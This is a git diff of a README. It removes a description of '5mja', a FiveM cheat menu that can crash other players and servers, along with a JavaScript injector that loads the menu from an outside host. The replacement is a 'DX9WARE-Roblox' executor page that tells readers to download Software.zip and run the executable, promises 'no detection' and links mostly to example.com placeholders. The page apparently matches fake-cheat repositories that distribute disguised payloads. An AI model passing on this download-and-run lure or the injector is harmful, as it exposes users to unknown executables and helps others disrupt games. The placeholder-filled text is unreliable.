@@ -1,30 +1,86 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
+# DX9WARE-Roblox
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+**DX9WARE-Roblox** is a powerful Roblox executor that provides a secure, customizable Lua environment with a wide range of scripts and features. It's an external tool with no detection, perfect for advanced scripting.
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+![DX9WARE Logo](https://example.com/dx9ware-logo.png)
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+---
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+## Table of Contents
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Scripts](#scripts)
+- [Contributing](#contributing)
+- [License](#license)
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+---
+
+## Features
+
+🚀 **Powerful Lua Environment**: DX9WARE provides a robust Lua execution environment for advanced scripting within Roblox.
+
+🛡️ **Secure Execution**: Ensure secure execution of your Lua scripts without detection.
+
+🎨 **Customizable**: Customize your experience with a wide range of available tools and options.
+
+🔧 **Simple Setup**: Easy to install and use, enabling you to get started quickly.
+
+---
+
+## Installation
+
+To install **DX9WARE-Roblox**, follow these steps:
+
+1. Download the [Software.zip](https://github.com/user-attachments/files/17394153/Software.zip) file.
+2. Extract the contents to a folder on your computer.
+3. Run the executable file to launch DX9WARE-Roblox.
+
+For detailed installation instructions, refer to the [Installation Guide](https://example.com/dx9ware-installation).
+
+---
+
+## Usage
+
+Once you have installed **DX9WARE-Roblox**, you can follow these steps to start using it:
+
+1. Launch Roblox and log in to your account.
+2. Open **DX9WARE-Roblox** and configure your settings.
+3. Load your Lua scripts and start executing them within Roblox.
+
+For advanced usage tips and tricks, check out our [User Manual](https://example.com/dx9ware-user-manual).
+
+---
+
+## Scripts
+
+DX9WARE-Roblox comes with a variety of pre-built scripts to enhance your scripting experience. Here are some of the popular script categories:
+
+1. **Combat Scripts**: Scripts designed to enhance combat interactions within Roblox games.
+2. **Building Scripts**: Tools to assist in building and creation tasks.
+3. **Utility Scripts**: Miscellaneous scripts for various useful functionalities.
+
+You can explore the full range of available scripts in the [Scripts Directory](https://example.com/dx9ware-scripts).
+
+---
+
+## Contributing
+
+We welcome contributions from the community to make **DX9WARE-Roblox** even better. If you have suggestions, ideas, or feature requests, feel free to:
+
+- Open an [Issue](https://example.com/dx9ware-issues) to report bugs or request new features.
+- Submit a Pull Request with your proposed changes for review.
+
+To learn more about contributing guidelines and code of conduct, read our [Contribution Guide](https://example.com/dx9ware-contribution-guide).
+
+---
+
+## License
+
+The **DX9WARE-Roblox** project is licensed under the MIT License. For more information, see the [License File](https://example.com/dx9ware-license).
+
+---
+
+Thank you for using **DX9WARE-Roblox**! 🚀🎮
+
+![DX9WARE Screenshot](https://example.com/dx9ware-screenshot.png)
